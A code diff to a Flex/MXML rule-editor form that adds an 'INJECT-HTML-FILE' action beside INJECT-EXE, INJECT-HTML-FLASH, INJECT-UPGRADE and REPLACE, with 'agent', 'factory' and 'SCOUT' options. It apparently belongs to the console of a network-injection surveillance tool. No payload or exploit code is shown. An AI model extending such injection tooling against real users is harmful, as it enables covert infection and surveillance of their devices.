@@ -71,7 +71,7 @@
             }
           }
           
-          if (rule.action == 'REPLACE') {
+          if (rule.action == 'REPLACE' || rule.action == 'INJECT-HTML-FILE') {
             
             currentState = 'fileSelected';
             fileName.text = rule.action_param_name;
@@ -97,7 +97,7 @@
         if (hasValidationErrors())
           return;
         
-        if (action.selectedItem != 'REPLACE')
+        if (action.selectedItem != 'REPLACE' && action.selectedItem != 'INJECT-HTML-FILE')
           manageInject();
         
         else if (fileChanged)
@@ -118,7 +118,7 @@
         }
         
         agent.errorString = '';
-        if (action.selectedItem != 'REPLACE' && !agent.selectedItem) {
+        if (action.selectedItem != 'REPLACE' && action.selectedItem != 'INJECT-HTML-FILE' && !agent.selectedItem) {
           agent.errorString = 'Please select an agent';
           hasError = true;
         }
@@ -301,7 +301,7 @@
            <s:ArrayCollection>
              <fx:String>INJECT-EXE</fx:String>
              <fx:String>INJECT-HTML-FLASH</fx:String>
-             <fx:String>INJECT-HTML-JAVA</fx:String>
+             <fx:String>INJECT-HTML-FILE</fx:String>
              <fx:String>INJECT-UPGRADE</fx:String>
              <fx:String>REPLACE</fx:String>
            </s:ArrayCollection>
@@ -309,20 +309,20 @@
        </s:DropDownList>
     </s:FormItem>
     
-    <s:FormItem visible="{action.selectedItem != 'REPLACE'}" label="{R.get('FACTORY')}"
-                includeInLayout="{action.selectedItem != 'REPLACE'}">
+    <s:FormItem visible="{action.selectedItem != 'REPLACE' &amp;&amp; action.selectedItem != 'INJECT-HTML-FILE'}" label="{R.get('FACTORY')}"
+                includeInLayout="{action.selectedItem != 'REPLACE' &amp;&amp; action.selectedItem != 'INJECT-HTML-FILE'}">
       <itemfield:ItemField id="agent" width="200" kinds="{['factory']}"
                            selectedItemId="{rule.action_param}" path="{_selectedTarget}"/> <!--  -->
     </s:FormItem>
    
-    <s:FormItem visible="{action.selectedItem == 'REPLACE'}" label="{R.get('FILE')}"
-                includeInLayout="{action.selectedItem == 'REPLACE'}">
+    <s:FormItem visible="{action.selectedItem == 'REPLACE' || action.selectedItem == 'INJECT-HTML-FILE'}" label="{R.get('FILE')}"
+                includeInLayout="{action.selectedItem == 'REPLACE' || action.selectedItem == 'INJECT-HTML-FILE'}">
       <s:Button excludeFrom="fileSelected" width="100" label="{R.get('BROWSE')}..." click="browse()"/>
       <s:Label id="fileName" includeIn="fileSelected" width="200" buttonMode="true" click="browse()"
                maxDisplayedLines="1" paddingTop="8" toolTip="{R.get('CLICK_TO_CHANGE_FILE')}"
                verticalAlign="middle"/>
     </s:FormItem>
-    <s:FormItem  label="{R.get('SCOUT')}" visible="{!LicenseManager.instance.scout}" includeInLayout="{!LicenseManager.instance.scout}" enabled="{!LicenseManager.instance.scout}">
+    <s:FormItem  label="{R.get('SCOUT')}" visible="{!LicenseManager.instance.scout &amp;&amp; action.selectedItem != 'REPLACE' &amp;&amp; action.selectedItem != 'INJECT-HTML-FILE'}" includeInLayout="{!LicenseManager.instance.scout}" enabled="{!LicenseManager.instance.scout}">
       <s:CheckBox id="scoutCh" visible="{!LicenseManager.instance.scout}" includeInLayout="{!LicenseManager.instance.scout}" enabled="{!LicenseManager.instance.scout}" selected="true"/>
     </s:FormItem>
     
